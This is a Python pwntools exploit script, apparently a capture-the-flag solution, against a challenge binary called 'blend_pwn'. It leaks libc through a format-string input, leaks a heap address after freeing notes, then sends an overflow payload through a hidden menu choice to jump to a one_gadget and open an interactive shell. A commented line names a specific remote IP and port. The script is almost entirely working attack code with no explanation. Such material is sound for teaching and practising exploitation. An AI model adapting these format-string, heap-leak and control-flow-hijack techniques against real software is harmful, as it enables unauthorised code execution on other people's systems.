#!/usr/bin/python
#coding=utf-8
from pwn import *
context.binary = "./blend_pwn"
context.terminal = ['gnome-terminal','-x','sh','-c']
context.log_level = 'debug'
# p = remote('47.111.104.99','51904')
p = process('./blend_pwn')
elf = ELF('./blend_pwn')
libc = elf.libc
one = [0x45226,0x4527a,0xf0364,0xf1207]
def show_name():
	p.sendlineafter('Enter your choice >','1')
def new(payload):
	p.sendlineafter('Enter your choice >','2')
	p.sendafter('input note:\n',payload)
def delete(idx):
	p.sendlineafter('Enter your choice >','3')
	p.sendlineafter('index>',str(idx))
def show():
	p.sendlineafter('Enter your choice >','4')
def exit():
	p.sendlineafter('Enter your choice >','5')

p.recvuntil('Please enter a name: ')
p.sendline('%11$p')
p.recvuntil('5.exit\n')
show_name()
p.recvuntil(':')
libc_base = int(p.recvuntil('\n',drop=True)[2:],16)-240-libc.sym['__libc_start_main']
one_gadget = libc_base+one[2]
info(hex(libc_base))
new('bbb\n')
new('\x00'*0x18+p64(one_gadget)+'\n')

delete(1)
delete(0) 

show()
p.recvuntil('index 1:')
heap_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
info(hex(heap_addr))

p.sendlineafter('Enter your choice >','666')
# gdb.attach(p,'''b malloc
# 				b *0x7ffff74ea467
# 				b *0x7ffff7ae0d42''')

payload = 'a'*0x20+p64(heap_addr+0x20)[:-1]
# gdb.attach(p)
p.sendlineafter('Please input what you want:',payload)
# pause()
p.interactive()